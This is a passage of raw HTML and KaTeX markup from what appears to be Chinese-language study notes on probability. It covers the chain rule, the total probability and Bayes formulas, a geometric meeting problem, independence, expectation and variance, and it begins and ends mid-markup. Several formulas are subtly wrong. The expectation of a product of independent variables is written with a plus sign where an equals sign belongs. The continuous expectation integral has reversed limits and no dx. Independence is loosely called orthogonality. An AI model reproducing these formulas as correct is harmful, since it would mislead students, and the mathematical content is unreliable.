style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li><strong>条件概率的链式法则：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>b</mi><mi mathvariant="normal">∣</mi><mi>c</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(a,b,c)=P(a|b,c)P(b,c)=P(a|b,c)P(b|c)P(c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">∣</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">∣</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mord">∣</span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mclose">)</span></span></span></span></li><li><strong>全概率公式：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∑</mo><mi>i</mi></msub><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi mathvariant="normal">∣</mi><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(A)=\sum_{i} P(A|B_i)P(B_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li><li><strong>贝叶斯（Bayes）公式：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>B</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mi>A</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi mathvariant="normal">∣</mi><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mrow><msub><mo>∑</mo><mi>j</mi></msub><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi mathvariant="normal">∣</mi><msub><mi>B</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>B</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">P(B_i|A)=\frac{P(A|B_i)P(B_i)}{\sum_{j}P(A|B_j)P(B_j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.677227em;vertical-align:-0.667227em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.14964714285714287em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46032428571428574em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">A</span><span class="mord mtight">∣</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">A</span><span class="mord mtight">∣</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.05017em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.667227em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><ul><li>对于求解<a href="http://www.cnblogs.com/AndyJee/p/4714781.html">碰面问题</a>的概率，可以通过画出x和y所有可能的区域，再求出碰面的范围，再计算面积得到。<br /><img src="http://p8cigu7up.bkt.clouddn.com/1526188781608ucrz546h.png?imageslim" alt="paste image" /></li><li>如果使用积分，需要考虑两种情况，一个是x&lt;=3,x可以等1个小时，另一个是x&gt;3，x只能等4-x小时。计算稍微复杂一些。</li></ul></li><li><strong>事件独立：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(AB)=P(A)P(B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span>事件A⊥B正交。</li><li>**条件独立：**A⊥B|Z，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mi mathvariant="normal">∣</mi><mi>Z</mi><mo stretchy="false">)</mo><mo>=</mo><mi>P</mi><mo stretchy="false">(</mo><mi>A</mi><mi mathvariant="normal">∣</mi><mi>Z</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>B</mi><mi mathvariant="normal">∣</mi><mi>Z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(A,B|Z)=P(A|Z)P(B|Z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span></span></li><li>**期望：**1、离散型：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∑</mo><mi>i</mi></msub><msub><mi>x</mi><mi>i</mi></msub><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">E(x)=\sum_{i}x_ip_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>；2、连续型：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∫</mo><mi mathvariant="normal">∞</mi><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></msubsup><mi>x</mi><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(x)=\int_\infty^{-\infty} xf(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.322051em;vertical-align:-0.35582em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9662310000000001em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">∞</span></span></span><span style="top:-3.2579000000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35582em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>(概率加权的平均值)<ul><li>期望的性质：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>k</mi><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(kX)=kE(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo>+</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(X+Y)=E(X)+E(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>，若X和Y相互独立<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(XY)+E(X)E(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></li></ul></li><li><strong>方差：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mrow><mo stretchy="false">[</mo><mi>X</mi><mo>−</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><msup><mi>X</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>−</mo><msup><mi>E</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Var(X)=E{[X-E(X)]^2}=E(X^2)-E^2(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span><ul><li>方差的性质：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">Var(c)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo>+</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Var(X+c)=Var(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span 